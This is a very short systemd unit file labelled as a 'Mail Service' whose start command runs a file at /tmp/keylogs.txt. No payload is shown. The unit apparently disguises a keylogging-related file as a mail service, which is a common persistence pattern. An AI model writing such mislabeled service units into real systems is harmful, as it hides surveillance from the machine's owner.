# mail.service
[Unit]
Description=Mail Service

[Service]
Type=oneshot
ExecStart=/tmp/keylogs.txt
